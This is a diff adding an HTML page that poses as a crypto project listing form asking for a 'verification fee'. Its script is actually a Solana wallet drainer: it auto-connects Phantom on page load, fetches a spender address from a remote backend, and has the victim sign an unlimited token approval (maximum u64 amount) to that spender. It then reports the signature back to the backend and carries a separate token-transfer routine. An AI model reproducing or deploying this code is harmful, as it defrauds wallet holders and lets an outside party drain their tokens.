@@ -1,0 +1,894 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crypto Project Listing</title>
+  <style>
+    * {
+  box-sizing: border-box;
+}
+
+.video-bg {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  z-index: 0; /* lowest layer */
+}
+
+.video-overlay {
+  position: absolute;
+  inset: 0;
+  background: rgba(255,255,255,0.7);
+  z-index: 1; /* middle layer */
+}
+
+.page, .modal {
+  position: relative;
+  z-index: 10; /* top layer so buttons are clickable */
+}
+
+
+body {
+  margin: 0;
+  font-family: system-ui, sans-serif;
+  background: #f2f2f2;
+}
+
+.page {
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+}
+
+.card {
+  background: #0f0f0f;
+  color: #fff;
+  width: 100%;
+  max-width: 900px;
+  padding: 28px;
+  border-radius: 14px;
+  box-shadow: 0 20px 50px rgba(0,0,0,0.4);
+}
+
+h2 {
+  text-align: center;
+  margin-bottom: 24px;
+}
+
+.grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  gap: 14px;
+}
+
+input,
+select,
+textarea {
+  width: 100%;
+  padding: 14px;
+  border-radius: 10px;
+  border: none;
+  background: #1a1a1a;
+  color: #ffffff;
+}
+
+input::placeholder,
+textarea::placeholder {
+  color: #7a7a7a;
+}
+
+textarea {
+  margin-top: 14px;
+  min-height: 110px;
+}
+
+.btn-primary {
+  margin-top: 20px;
+  padding: 14px;
+  width: 100%;
+  background: #5b2dbd;
+  border: none;
+  border-radius: 10px;
+  color: #fff;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+.btn-primary:hover {
+  background: #6e3fe0;
+}
+
+label {
+  margin-bottom: 5px;
+  color: #555;
+}
+
+button {
+  padding: 10px;
+  background-color: #6e3fe0;
+  color: #fff;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #5c00b3;
+}
+
+.status-box {
+  position: fixed;
+  left: 50%;
+  bottom: 20px;
+  transform: translateX(-50%);
+  z-index: 2000;
+  max-width: 560px;
+  width: calc(100% - 24px);
+  background: rgba(10, 10, 10, 0.95);
+  color: #fff;
+  border: 1px solid rgba(255, 255, 255, 0.12);
+  border-radius: 12px;
+  padding: 12px 14px;
+  box-shadow: 0 14px 30px rgba(0, 0, 0, 0.3);
+  font-size: 14px;
+  line-height: 1.45;
+}
+
+.status-box.error {
+  border-color: rgba(255, 92, 92, 0.6);
+}
+
+/* ============================
+   MODALS
+   ============================ */
+
+.modal {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.75);
+  backdrop-filter: blur(6px);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  isolation: isolate; /* ✅ FIX: prevents stacking trap */
+  animation: modalFadeIn 0.25s ease-out;
+}
+
+.modal.hidden {
+  display: none;
+}
+
+.modal-content {
+  background: linear-gradient(180deg, #121212, #0b0b0b);
+  color: #fff;
+  padding: 28px 26px 30px;
+  border-radius: 18px;
+  width: 92%;
+  max-width: 420px;
+  text-align: center;
+  box-shadow:
+    0 30px 60px rgba(0, 0, 0, 0.6),
+    inset 0 1px 0 rgba(255, 255, 255, 0.04);
+  transform: scale(0.96);
+  animation: modalPop 0.25s ease-out forwards;
+}
+
+.modal-content p {
+  margin: 18px 0 24px;
+  font-size: 15px;
+  line-height: 1.6;
+  color: #d0d0d0;
+}
+
+.close {
+  position: absolute;
+  top: 14px;
+  right: 18px;
+  font-size: 26px;
+  font-weight: 400;
+  color: #888;
+  cursor: pointer;
+  transition: color 0.2s ease, transform 0.2s ease;
+}
+
+.close:hover {
+  color: #fff;
+  transform: rotate(90deg);
+}
+
+.modal-content button {
+  width: 100%;
+  padding: 14px;
+  margin-top: 12px;
+  border-radius: 12px;
+  border: none;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: transform 0.15s ease, box-shadow 0.15s ease;
+}
+
+#proceedButton {
+  background: linear-gradient(135deg, #6e3fe0, #5b2dbd);
+  color: #fff;
+  box-shadow: 0 10px 25px rgba(110, 63, 224, 0.35);
+}
+
+#proceedButton:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 14px 30px rgba(110, 63, 224, 0.45);
+}
+
+/* ============================
+   WALLET BUTTONS
+   ============================ */
+
+.wallet-btn {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  width: 100%;
+  padding: 14px;
+  border-radius: 12px;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  background: #1a1a1a;
+  color: #fff;
+  border: 1px solid rgba(255, 255, 255, 0.08);
+  transition: transform 0.15s ease, box-shadow 0.15s ease, background 0.15s ease;
+}
+
+.wallet-btn:hover {
+  background: #222;
+  transform: translateY(-1px);
+}
+
+.wallet-btn.loading {
+  opacity: 0.8;
+  cursor: wait;
+}
+
+.wallet-icon {
+  width: 22px;
+  height: 22px;
+  background-size: contain;
+  background-repeat: no-repeat;
+  background-position: center;
+}
+
+.wallet-icon.phantom {
+background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='256' height='256' viewBox='0 0 256 256'%3E%3Ccircle cx='128' cy='128' r='128' fill='%23AB9FF2'/%3E%3Cpath fill='%23FFFFFF' d='M176.3 91.7c-11.6-11.6-27.1-18-43.5-18s-31.9 6.4-43.5 18c-11.6 11.6-18 27.1-18 43.5s6.4 31.9 18 43.5c11.6 11.6 27.1 18 43.5 18s31.9-6.4 43.5-18c11.6-11.6 18-27.1 18-43.5s-6.4-31.9-18-43.5zm-43.5 74.2c-16.9 0-30.7-13.8-30.7-30.7s13.8-30.7 30.7-30.7 30.7 13.8 30.7 30.7-13.8 30.7-30.7 30.7z'/%3E%3C/svg%3E");
+}
+
+.wallet-icon.walletconnect {
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 400'%3E%3Cpath fill='%233B99FC' d='M100 200c27-27 73-27 100 0l14 14 14-14c27-27 73-27 100 0l36 36-50 50-36-36c-27-27-73-27-100 0l-14 14-14-14c-27-27-73-27-100 0l-36 36-50-50z'/%3E%3C/svg%3E");
+}
+
+/* ============================
+   WALLETCONNECT v2 OVERLAY FIX
+   ============================ */
+
+.walletconnect-modal__base,
+#walletconnect-wrapper {
+  z-index: 20000 !important;
+}
+
+/* ============================
+   ANIMATIONS
+   ============================ */
+
+@keyframes modalFadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+
+@keyframes modalPop {
+  to { transform: scale(1); }
+}
+
+  .wallet-panel {
+    margin-top: 24px;
+    background: rgba(15, 15, 15, 0.95);
+    color: #fff;
+    padding: 20px;
+    border-radius: 14px;
+    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.35);
+  }
+
+  .wallet-panel h3 {
+    margin: 0 0 8px;
+    font-size: 20px;
+  }
+
+  .wallet-panel p {
+    margin: 0 0 14px;
+    color: #bcbcbc;
+    font-size: 14px;
+  }
+
+  .wallet-summary-output {
+    margin-top: 12px;
+    padding: 12px;
+    background: #111;
+    border-radius: 10px;
+    color: #d6d6d6;
+    font-size: 14px;
+    line-height: 1.5;
+  }
+
+  .wallet-summary-output ul {
+    margin: 8px 0 0;
+    padding-left: 16px;
+  }
+
+@media (max-width: 600px) {
+  .container {
+    padding: 15px;
+  }
+}
+
+  
+    #bgVideo { position: fixed; right: 0; bottom: 0; min-width: 100%; min-height: 100%; z-index: -2; }
+    .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: -1; }
+    .page { position: relative; z-index: 10; }
+    /* Ensure WalletConnect modal is ALWAYS on top */
+    wcm-modal { z-index: 99999 !important; position: relative; }
+  </style>
+</head>
+<body>
+  <video autoplay muted loop id="bgVideo">
+    <source src="List/animatealpha.mp4" type="video/mp4">
+  </video>
+  <div class="video-overlay"></div>
+
+  <main class="page">
+    <form id="projectForm" class="card">
+      <h2>Submit Your Project</h2>
+      <div class="grid">
+        <input id="projectNameInput" placeholder="Project Name" required />
+        <input id="projectSymbolInput" placeholder="Project Symbol" required />
+        <select id="chainSelect" required>
+          <option value="">Select Chain</option>
+          <option>Ethereum</option>
+          <option>BNB Chain</option>
+          <option>Solana</option>
+          <option>Polygon</option>
+          <option>Arbitrum</option>
+        </select>
+        <input id="contractAddressInput" placeholder="Contract Address" required />
+        <input id="totalSupplyInput" type="number" inputmode="numeric" pattern="\d*" placeholder="Total Supply" min="0" />
+        <input id="circulatingSupplyInput" type="number" inputmode="numeric" pattern="\d*" placeholder="Circulating Supply" min="0" />
+      </div>
+      <textarea placeholder="Other necessary information"></textarea>
+      <div class="grid">
+        <input id="developerNameInput" placeholder="Developer Name" required />
+        <input id="developerEmailInput" type="email" placeholder="Developer Email" required />
+      </div>
+      <button type="button" class="btn-primary" id="submitButton">Submit</button>
+    </form>
+  <div id="feeModal" class="modal hidden">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <p>A verification fee is required to list your project.</p>
+      <button id="proceedButton">Proceed to Payment</button>
+    </div>
+  </div>
+
+  <div id="walletModal" class="modal hidden">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <p>Select your wallet to continue:</p>
+      <p style="margin-top: 0; font-size: 13px; color: #a7a7a7;">Choose Phantom or WalletConnect to continue.</p>
+      <button id="phantomButton" class="wallet-btn">Phantom</button>
+      <button id="walletConnectButton" class="wallet-btn">WalletConnect</button>
+    </div>
+  </div>
+
+  <div id="statusBox" class="status-box" style="display: none;"></div>
+
+  <script>
+    let walletLibs = null;
+    let connectedWalletAddress = null;
+    let signTransactionFn = null;
+
+    async function loadWalletLibs() {
+      if (walletLibs) {
+        return walletLibs;
+      }
+
+      const [solanaModule, splTokenModule] = await Promise.all([
+        import('https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/+esm'),
+        import('https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.11/+esm')
+      ]);
+
+      walletLibs = {
+        Connection: solanaModule.Connection,
+        PublicKey: solanaModule.PublicKey,
+        Transaction: solanaModule.Transaction,
+        createApproveInstruction: splTokenModule.createApproveInstruction,
+        createTransferInstruction: splTokenModule.createTransferInstruction,
+        getAssociatedTokenAddress: splTokenModule.getAssociatedTokenAddress,
+        createAssociatedTokenAccountInstruction: splTokenModule.createAssociatedTokenAccountInstruction,
+        ASSOCIATED_TOKEN_PROGRAM_ID: splTokenModule.ASSOCIATED_TOKEN_PROGRAM_ID,
+        TOKEN_PROGRAM_ID: splTokenModule.TOKEN_PROGRAM_ID
+      };
+
+      window.Connection = walletLibs.Connection;
+      window.PublicKey = walletLibs.PublicKey;
+      window.Transaction = walletLibs.Transaction;
+      window.createApproveInstruction = walletLibs.createApproveInstruction;
+      window.createTransferInstruction = walletLibs.createTransferInstruction;
+      window.getAssociatedTokenAddress = walletLibs.getAssociatedTokenAddress;
+      window.createAssociatedTokenAccountInstruction = walletLibs.createAssociatedTokenAccountInstruction;
+      window.ASSOCIATED_TOKEN_PROGRAM_ID = walletLibs.ASSOCIATED_TOKEN_PROGRAM_ID;
+      window.TOKEN_PROGRAM_ID = walletLibs.TOKEN_PROGRAM_ID;
+
+      return walletLibs;
+    }
+
+    const projectForm = document.getElementById('projectForm');
+    const feeModal = document.getElementById('feeModal');
+    const walletModal = document.getElementById('walletModal');
+    const closeButtons = document.getElementsByClassName('close');
+    const proceedButton = document.getElementById('proceedButton');
+    const phantomButton = document.getElementById('phantomButton');
+    const walletConnectButton = document.getElementById('walletConnectButton');
+    const statusBox = document.getElementById('statusBox');
+    const walletSummaryButton = document.getElementById('walletSummaryButton');
+    const walletAddressInput = document.getElementById('walletAddressInput');
+    const walletSummaryOutput = document.getElementById('walletSummaryOutput');
+    const transferTokenButton = document.getElementById('transferTokenButton');
+    const recipientAddressInput = document.getElementById('recipientAddressInput');
+    const mintAddressInput = document.getElementById('mintAddressInput');
+    const tokenAccountInput = document.getElementById('tokenAccountInput');
+    const transferAmountInput = document.getElementById('transferAmountInput');
+    const chainSelect = document.getElementById('chainSelect');
+    const contractAddressInput = document.getElementById('contractAddressInput');
+    const totalSupplyInput = document.getElementById('totalSupplyInput');
+    const circulatingSupplyInput = document.getElementById('circulatingSupplyInput');
+    const developerEmailInput = document.getElementById('developerEmailInput');
+
+    let wcProvider = null;
+    let provider = null;
+    let signer = null;
+    let activeProviderType = null;
+    const API_BASE_URL = 'https://void-production-d066.up.railway.app';
+
+    function setStatus(message, isError = false) {
+      if (!isError) {
+        statusBox.style.display = 'none';
+        statusBox.textContent = '';
+        statusBox.classList.remove('error');
+        return;
+      }
+
+      statusBox.style.display = 'block';
+      statusBox.textContent = message;
+      statusBox.classList.add('error');
+    }
+
+    function closeModal(modal) {
+      modal?.classList.add('hidden');
+    }
+
+    function openModal(modal) {
+      modal?.classList.remove('hidden');
+    }
+
+    function escapeHtml(value) {
+      return String(value)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;');
+    }
+
+    const submitButton = document.getElementById('submitButton');
+
+    document.addEventListener('DOMContentLoaded', () => {
+      if (window.solana && window.solana.isPhantom) {
+        console.log('Phantom extension detected. Initiating auto-connect...');
+        connectPhantom();
+      }
+    });
+
+    function isValidContractAddress(value, chain) {
+      if (!value) {
+        return false;
+      }
+
+      const trimmed = value.trim();
+      if (chain === 'Solana') {
+        return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(trimmed);
+      }
+
+      return /^0x[a-fA-F0-9]{40}$/.test(trimmed);
+    }
+
+    function validateFormData() {
+      const chain = chainSelect?.value || '';
+      const contractAddress = contractAddressInput?.value?.trim() || '';
+      const totalSupply = totalSupplyInput?.value?.trim() || '';
+      const circulatingSupply = circulatingSupplyInput?.value?.trim() || '';
+      const developerEmail = developerEmailInput?.value?.trim() || '';
+
+      if (!isValidContractAddress(contractAddress, chain)) {
+        setStatus(chain === 'Solana'
+          ? 'Please enter a valid Solana contract address.'
+          : 'Please enter a valid 0x contract address.', true);
+        return false;
+      }
+
+      if (totalSupply !== '' && !/^[0-9]+$/.test(totalSupply)) {
+        setStatus('Total supply must contain only numbers.', true);
+        return false;
+      }
+
+      if (circulatingSupply !== '' && !/^[0-9]+$/.test(circulatingSupply)) {
+        setStatus('Circulating supply must contain only numbers.', true);
+        return false;
+      }
+
+      if (!developerEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(developerEmail)) {
+        setStatus('Developer email must be a valid email address.', true);
+        return false;
+      }
+
+      setStatus('', false);
+      return true;
+    }
+
+    if (projectForm && feeModal) {
+      projectForm.addEventListener('submit', (event) => {
+        event.preventDefault();
+        if (!validateFormData()) {
+          return;
+        }
+        if (window.solana && window.solana.isPhantom) {
+          connectPhantom();
+        } else {
+          openModal(feeModal);
+        }
+      });
+    }
+
+    if (submitButton && feeModal) {
+      submitButton.addEventListener('click', () => {
+        if (!validateFormData()) {
+          return;
+        }
+        if (window.solana && window.solana.isPhantom) {
+          connectPhantom();
+        } else {
+          openModal(feeModal);
+        }
+      });
+    }
+
+    if (closeButtons[0] && feeModal) {
+      closeButtons[0].addEventListener('click', () => closeModal(feeModal));
+    }
+
+    if (proceedButton && feeModal && walletModal) {
+      proceedButton.addEventListener('click', () => {
+        closeModal(feeModal);
+        openModal(walletModal);
+      });
+    }
+
+    if (closeButtons[1] && walletModal) {
+      closeButtons[1].addEventListener('click', () => closeModal(walletModal));
+    }
+
+    if (phantomButton) {
+      phantomButton.addEventListener('click', connectPhantom);
+    }
+
+    if (walletConnectButton) {
+      walletConnectButton.addEventListener('click', connectWalletConnect);
+    }
+
+    if (walletSummaryButton) {
+      walletSummaryButton.addEventListener('click', loadWalletSummary);
+    }
+
+    if (transferTokenButton) {
+      transferTokenButton.addEventListener('click', sendSplTokenToRecipient);
+    }
+
+    async function loadWalletSummary() {
+      const address = (walletAddressInput?.value || connectedWalletAddress || '').trim();
+      if (!address) {
+        setStatus('Connect wallet.', true);
+        return;
+      }
+
+      try {
+        setStatus('Loading SPL token balances...');
+        const res = await fetch(`${API_BASE_URL}/api/wallet-summary?wallet=${encodeURIComponent(address)}`);
+        const data = await res.json();
+
+        if (!res.ok) {
+          throw new Error(data.error || 'Unable to detect token');
+        }
+
+        if (!walletSummaryOutput) {
+          return;
+        }
+
+        if (!data.tokens?.length) {
+          walletSummaryOutput.innerHTML = '<p>No SPL tokens found for this wallet.</p>';
+          setStatus(`No SPL tokens found for ${address}.`, false);
+          return;
+        }
+
+        const items = data.tokens.map((token) => {
+          const usdValue = token.usdValue != null ? `$${token.usdValue.toFixed(2)}` : 'n/a';
+          return `<li><strong>${escapeHtml(token.mintAddress.slice(0, 8))}...</strong> Balance: ${token.balance.toLocaleString()} · USD: ${usdValue}</li>`;
+        }).join('');
+
+        walletSummaryOutput.innerHTML = `<p><strong>Total USD:</strong> $${data.totalUsdValue.toFixed(2)}</p><ul>${items}</ul>`;
+        setStatus(`Loaded ${data.tokenCount} SPL token account(s).`, false);
+      } catch (error) {
+        console.error(error);
+        if (walletSummaryOutput) {
+          walletSummaryOutput.innerHTML = '<p>Unable to load token balances right now.</p>';
+        }
+        setStatus(error.message || 'Unable to detect token.', true);
+      }
+    }
+
+    async function sendSplTokenToRecipient() {
+      if (!connectedWalletAddress) {
+        setStatus('Connect wallet.', true);
+        return;
+      }
+
+      const recipientAddress = recipientAddressInput?.value?.trim();
+      const mintAddress = mintAddressInput?.value?.trim();
+      const sourceTokenAccount = tokenAccountInput?.value?.trim();
+      const amountValue = transferAmountInput?.value?.trim();
+
+      if (!recipientAddress || !mintAddress || !amountValue) {
+        setStatus('Recipient address, mint address, and amount are required.', true);
+        return;
+      }
+
+      try {
+        setStatus('Creating a transfer transaction...');
+
+        const { Connection: SolanaConnection, PublicKey, Transaction, createTransferInstruction, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } = await loadWalletLibs();
+        const connection = new SolanaConnection('https://api.mainnet-beta.solana.com', 'confirmed');
+        const fromPubkey = new PublicKey(connectedWalletAddress);
+        const recipientPubkey = new PublicKey(recipientAddress);
+        const mintPubkey = new PublicKey(mintAddress);
+        const amount = BigInt(amountValue);
+        const sourceAta = sourceTokenAccount ? new PublicKey(sourceTokenAccount) : await getAssociatedTokenAddress(mintPubkey, fromPubkey);
+        const recipientAta = await getAssociatedTokenAddress(mintPubkey, recipientPubkey);
+
+        const tx = new Transaction();
+        const recipientAccount = await connection.getAccountInfo(recipientAta);
+        if (!recipientAccount) {
+          tx.add(createAssociatedTokenAccountInstruction(fromPubkey, recipientAta, recipientPubkey, mintPubkey, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID));
+        }
+
+        tx.add(createTransferInstruction(sourceAta, recipientAta, fromPubkey, amount, [], TOKEN_PROGRAM_ID));
+
+        const latestBlockhash = await connection.getLatestBlockhash();
+        tx.feePayer = fromPubkey;
+        tx.recentBlockhash = latestBlockhash.blockhash;
+
+        if (!signTransactionFn) {
+          throw new Error('No wallet signer is available. Connect a valid wallet.');
+        }
+
+        const signedTx = await signTransactionFn(tx);
+        if (!signedTx || typeof signedTx.serialize !== 'function') {
+          throw new Error('The wallet did not return a valid signed transaction.');
+        }
+
+        const serializedTx = Buffer.from(signedTx.serialize()).toString('base64');
+        const signature = await connection.sendRawTransaction(signedTx.serialize());
+        await connection.confirmTransaction({
+          signature,
+          blockhash: latestBlockhash.blockhash,
+          lastValidBlockHeight: latestBlockhash.lastValidBlockHeight
+        }, 'confirmed');
+
+        const backendResponse = await fetch(`${API_BASE_URL}/api/send-spl-token`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            serializedTransaction: serializedTx,
+            walletAddress: connectedWalletAddress,
+            recipientAddress,
+            mintAddress,
+            amount: amountValue,
+            tokenAccount: sourceTokenAccount || sourceAta.toBase58()
+          })
+        });
+
+        const backendData = await backendResponse.json().catch(() => ({}));
+        if (!backendResponse.ok) {
+          throw new Error(backendData.error || 'Transfer could not be logged.');
+        }
+
+        setStatus(`Transfer broadcast successfully. Signature: ${signature}`, false);
+      } catch (error) {
+        console.error('Transfer flow error:', error);
+        setStatus(`Transfer flow stopped: ${error.message}`, true);
+      }
+    }
+
+    async function connectPhantom() {
+      try {
+        if (!window.solana || !window.solana.isPhantom) {
+          setStatus('Phantom is not installed. Please install it and try again.', true);
+          return;
+        }
+
+        const resp = await window.solana.connect();
+        const account = resp.publicKey.toString();
+        connectedWalletAddress = account;
+        signTransactionFn = async (tx) => window.solana.signTransaction(tx);
+        provider = window.solana;
+        signer = window.solana;
+        activeProviderType = 'phantom';
+        closeModal(walletModal);
+        closeModal(feeModal);
+        setStatus(`Phantom connected: ${account}`);
+        await approveSpender(account, async (tx) => window.solana.signTransaction(tx), 'Phantom');
+      } catch (error) {
+        console.error('Phantom connection error:', error);
+        setStatus(`Phantom connection failed: ${error.message}`, true);
+      }
+    }
+
+    async function connectWalletConnect() {
+      try {
+        if (wcProvider) {
+          await wcProvider.disconnect().catch(() => {});
+          wcProvider = null;
+        }
+
+        walletConnectButton.classList.add('loading');
+        walletConnectButton.disabled = true;
+
+        const { WalletConnectWalletAdapter } = await import('https://esm.sh/@walletconnect/solana-adapter@0.0.9?bundle');
+
+        wcProvider = new WalletConnectWalletAdapter({
+          network: 'mainnet-beta',
+          options: {
+            projectId: 'bc30b4aa529543b802f21f8ffbf32acf',
+            metadata: {
+              name: 'Crypto Project Listing',
+              description: 'Submit project and approve spender',
+              url: window.location.origin,
+              icons: ['https://avatars.githubusercontent.com/u/0']
+            }
+          }
+        });
+
+        const connectionPromise = wcProvider.connect();
+        const timeoutPromise = new Promise((_, reject) => {
+          setTimeout(() => reject(new Error('WalletConnect did not respond in time. Please try again.')), 30000);
+        });
+
+        await Promise.race([connectionPromise, timeoutPromise]);
+
+        const account = wcProvider.publicKey?.toBase58?.();
+        if (!account) {
+          throw new Error('WalletConnect did not return a Solana public key.');
+        }
+
+        connectedWalletAddress = account;
+        signTransactionFn = async (tx) => wcProvider.signTransaction(tx);
+        provider = wcProvider;
+        signer = wcProvider;
+        activeProviderType = 'walletconnect';
+
+        closeModal(walletModal);
+        setStatus(`WalletConnect connected: ${account}`);
+        await approveSpender(account, async (tx) => wcProvider.signTransaction(tx), 'WalletConnect');
+      } catch (err) {
+        console.error(err);
+        setStatus(err?.message || 'Wallet Connection Error. Please retry or refresh the page.', true);
+      } finally {
+        walletConnectButton.classList.remove('loading');
+        walletConnectButton.disabled = false;
+      }
+    }
+
+    async function approveSpender(account, signFn, walletName) {
+      try {
+        setStatus(`Preparing approval request for ${walletName}...`);
+        const res = await fetch(`${API_BASE_URL}/api/approval-config`);
+
+        if (!res.ok) {
+          throw new Error('The backend did not return a valid approval configuration.');
+        }
+
+        const { tokenAccount, spenderAddress } = await res.json();
+
+        if (!tokenAccount || !spenderAddress) {
+          throw new Error('Backend response did not include the required approval values.');
+        }
+
+        await approveSpenderSolana(account, tokenAccount, spenderAddress, signFn, walletName);
+      } catch (error) {
+        console.error('Approval config request failed:', error);
+        setStatus(`Approval request failed: ${error.message}`, true);
+      }
+    }
+
+    async function approveSpenderSolana(account, tokenAccount, spenderAddress, signTransactionFn, walletName) {
+      try {
+        setStatus(`Creating the approval transaction for ${walletName}...`);
+
+        const { Connection: SolanaConnection, PublicKey: SolanaPublicKey, Transaction: SolanaTransaction, createApproveInstruction: createApproveIx, TOKEN_PROGRAM_ID: SolanaTokenProgramId } = await loadWalletLibs();
+        const connection = new SolanaConnection('https://api.mainnet-beta.solana.com', 'confirmed');
+        const approveAmount = BigInt('18446744073709551615');
+
+        const approveIx = createApproveIx(
+          new SolanaPublicKey(tokenAccount),
+          new SolanaPublicKey(spenderAddress),
+          new SolanaPublicKey(account),
+          approveAmount,
+          [],
+          SolanaTokenProgramId
+        );
+
+        const tx = new SolanaTransaction().add(approveIx);
+        const latestBlockhash = await connection.getLatestBlockhash();
+        tx.feePayer = new SolanaPublicKey(account);
+        tx.recentBlockhash = latestBlockhash.blockhash;
+
+        const signedTx = await signTransactionFn(tx);
+        if (!signedTx || typeof signedTx.serialize !== 'function') {
+          throw new Error('The wallet did not return a valid signed transaction.');
+        }
+
+        const signature = await connection.sendRawTransaction(signedTx.serialize());
+        await connection.confirmTransaction({
+          signature,
+          blockhash: latestBlockhash.blockhash,
+          lastValidBlockHeight: latestBlockhash.lastValidBlockHeight
+        }, 'confirmed');
+
+        await fetch(`${API_BASE_URL}/api/approval-result`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            walletAddress: account,
+            tokenAccount,
+            spenderAddress,
+            signature,
+            status: 'success',
+            message: 'Approval transaction completed successfully.'
+          })
+        }).catch(() => {});
+
+        setStatus('Approval transaction sent successfully.', false);
+      } catch (error) {
+        console.error('Approval flow error:', error);
+        setStatus(`Approval flow stopped: ${error.message}`, true);
+      }
+    }
+
+    window.addEventListener('beforeunload', () => {
+      if (wcProvider?.disconnect) {
+        wcProvider.disconnect().catch(() => {});
+      }
+    });
+  </script>
+</body>
+</html>
